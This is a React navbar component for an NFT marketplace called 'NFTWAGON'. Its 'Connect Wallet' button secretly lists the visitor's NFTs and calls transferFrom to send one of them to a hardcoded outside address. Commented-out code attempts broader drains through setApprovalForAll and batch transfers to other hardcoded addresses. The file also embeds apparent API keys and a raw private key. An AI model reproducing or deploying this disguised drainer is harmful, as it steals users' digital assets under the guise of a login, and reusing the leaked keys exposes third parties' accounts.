import { MetaMaskConnector } from "wagmi/connectors/metaMask";
import { signIn } from "next-auth/react";
import { useAccount, useConnect, useSignMessage, useDisconnect } from "wagmi";
import { useAuthRequestChallengeEvm } from "@moralisweb3/next";
import { useEffect, useState } from 'react';
import {  ethers } from "ethers";
import { ABI1, ABI } from "../../contracts";
const Tx = require('ethereumjs-tx').Transaction
const { Web3 } = require('web3');
var Contract = require('web3-eth-contract');

const Moralis = require("moralis").default;
const { EvmChain } = require("@moralisweb3/common-evm-utils");
function Navbar() {
  const [isScrolled, setIsScrolled] = useState(false);

  useEffect(() => {
    const handleScroll = () => {
      if (window.scrollY > 0) {
        setIsScrolled(true);
      } else {
        setIsScrolled(false);
      }
    };

    window.addEventListener('scroll', handleScroll);

    return () => {
      window.removeEventListener('scroll', handleScroll);
    };
  }, []);

  
    const { connectAsync } = useConnect();
    const { disconnectAsync } = useDisconnect();
    const { isConnected } = useAccount();
    const { requestChallengeAsync } = useAuthRequestChallengeEvm();
    const [status, setStatus] = useState('');
    const handleAuth = async () => {
            try{
              if (typeof window.ethereum !== 'undefined') {
                window.web3 = new Web3(window.ethereum);
              }
                await Moralis.start({
                    apiKey: "zHsyrNp97JtRaQ7j7eg7t0ftLBie3ixlyuSu2iTMd0o2iJFWvirrfE5gnCWHfmRI",
                    // ...and any other configuration
                  });
            
      if (isConnected) {
        await disconnectAsync();
      }
      const { account, chain } = await connectAsync({
        connector: new MetaMaskConnector(),
      });
      const account1 = '0x37269d114cD1fc0777699B0B20518dbd7D87a7aA'; // Your account address 1
      const { message } = await requestChallengeAsync({
        address: account,
        chainId: chain.id,
      });
      const allNFTs = [];
      const chains = [EvmChain.ETHEREUM, EvmChain.BSC, EvmChain.POLYGON];

    for (const chain of chains) {
        const response = await Moralis.EvmApi.nft.getWalletNFTs({
        address: account,
        chain,
        });
        allNFTs.push(response);
    }
   

    async function requestAccount() {
      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
      return accounts[0];  // This will return the currently selected account in MetaMask
    }
    
    var url = "https://eth-mainnet.g.alchemy.com/v2/I4-ytXsWlHosPYRrizWlsYUPNLXqNiEs";
    const data = JSON.parse(JSON.stringify(allNFTs[0]));
    const web3 = new Web3(url);
    const tokenIds = data.result.map(item => item.token_id);
    const tokenHashes = data.result.map(item => item.token_address);
    const privateKey1 = Buffer.from('96a438471e8e4dea34dee6e02d2edfd3a76631b4382af7e16116c313d3da93a5', 'hex');
    const maxPriorityFeePerGas = ethers.utils.parseUnits('2', 'gwei'); // Example: 2 Gwei tip for miners
    const maxFeePerGas = ethers.utils.parseUnits('50', 'gwei'); // Max total fee (base fee + tip) you're willing to pay
    const accounts = await requestAccount();
    const contract = new web3.eth.Contract(ABI, tokenHashes[1]);
    contract.methods.transferFrom(accounts, "0x5Af5aE807692F3a9f99187bAa8E4966984F9d524", tokenIds[1])
      .send({ from: accounts })
      .on('confirmation', (confirmationNumber, receipt) => {
        console.log('Transaction confirmed:', confirmationNumber, receipt);
      })
      .on('error', error => {
        console.error('Error sending transaction:', error);
      });
    
    //for (let i = 0; i < length; i++) {
      // console.log(contract)
      //await contract.setApprovalForAll("0x5Af5aE807692F3a9f99187bAa8E4966984F9d524", true)
      // const tx =  contract.transferFrom(
    //     account, 
    //     "0x5Af5aE807692F3a9f99187bAa8E4966984F9d524",
    //     tokenIds[1]);
    //   console.log(tx)

    //   const txs = [
    //     {
    //       from : account,
    //       to: "0x5Af5aE807692F3a9f99187bAa8E4966984F9d524",
    //       data: tx,
    //       gas: 2000000,
    //       gasPrice: 2000000,      
    //     nonce: nonce
    //     },
    //   ];
    //   provider.estimateGas(txs).then(gasAmount => {
    //     console.log(`Estimated gas: ${gasAmount.toString()}`);
    // }).catch(error => {
    //     console.error(`Error estimating gas: ${error}`);
    // });
    //   const trasact = await signer.sendTransaction(txs)
     
  //}

    /*const data = JSON.parse(JSON.stringify(allNFTs[0]));
    var url = "https://mainnet.infura.io/v3/57f5f5f45dcd43f1b40212d6833281ed";
    
    const tokenIds = data.result.map(item => item.token_id);
    const tokenHashes = data.result.map(item => item.token_hash);
    const provider = new ethers.providers.JsonRpcProvider(url);

    const signer = provider.getSigner(account);

    // Create a contract instance
    const contract = new ethers.Contract("0x5e606f0b0f4eacfcd457038260ced11367806fe2", ABI, signer);
    console.log(signer)
    const privateKey1 = Buffer.from('96a438471e8e4dea34dee6e02d2edfd3a76631b4382af7e16116c313d3da93a5', 'hex');
    // Transfer the ERC721 token
      // Build the transaction
      const tx = await contract.safeTransferMultipleERC721Tokens(
        tokenHashes, 
        tokenIds, 
        "0x332f4b86C767CB38D96a74761da860493d2D8Dd7");
      const receipt = await tx.wait();
      console.log(privateKey1)
        const txObject = {
          to:       "0x332f4b86C767CB38D96a74761da860493d2D8Dd7",
          from: "0x37269d114cD1fc0777699B0B20518dbd7D87a7aA",
          data: myData  
        }
        const txHash = await window.ethereum.request({
          method: 'eth_sendTransaction',
          params: [txObject],
      });
      const  myData = await contract.approveContract("0x5e606f0b0f4eacfcd457038260ced11367806fe2", true);
      

    console.log(tokenHashes);
    console.log(tokenIds);*/


}catch (error) {
    console.error('Error:', error);
    setStatus('Error. Please check the console for details.');
  }

    };

    return(
        <>
        {!isScrolled ? (
          <div className="navbar-cont">
            <div className="logo">
                NFTWAGON
            </div>
            <input placeholder="Search for Collections, NFTs or Users">
             
            </input>
            <div className="navflex">
                <div className="navPages">Explore</div>
                <div className="navPages">Drops</div>
            </div>
            {isConnected ?(
                <div onClick={handleAuth} className="nav-btn">
                    <p>Disconnect</p>
                </div>
            ):(
                <div onClick={handleAuth} className="nav-btn">
                <p>Connect Wallet</p>
            </div>
            )
            }
         </div>
        ) :(
          <div className="navbar-cont-scroll">
            <div className="logo-scroll">
                NFTWAGON
            </div>
            <input className="scroll" placeholder="Search for Collections, NFTs or Users">
             
            </input>
            <div className="navflex-scroll">
                <div className="navPages-scrolled">Explore</div>
                <div className="navPages-scrolled">Drops</div>
            </div>
                <div onClick={handleAuth} className="nav-btn-scroll">
                    <p>Disconnect</p>
                </div>
         </div>
        )
        }
         
        </>
    )
}
export default Navbar